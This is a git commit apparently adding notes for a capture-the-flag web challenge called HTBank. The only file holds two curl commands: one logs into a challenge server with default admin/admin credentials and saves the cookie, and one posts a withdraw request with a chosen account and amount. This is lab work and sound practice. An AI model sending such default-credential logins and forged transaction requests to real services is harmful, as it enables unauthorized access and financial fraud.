e3cc8789a88189ea69e49923a8de2b82c9f0d1ae
szhan21 <shunda.zhang@intel.com>
2024-01-20 19:53:26 +0800

    Added HTBank.

---
+++ ctf/web/HTBank/dec.py
@@ -0,0 +1,7 @@
+'''
+curl -c cookies.txt -X POST -d "username=admin&password=admin" http://167.99.82.136:30557/api/login
+
+curl -b cookies.txt -X POST -d "account=0x866d133dec36c0a6325412a69c8e2ef7&amount=100" http://167.99.82.136:30557/api/withdraw
+
+
+'''
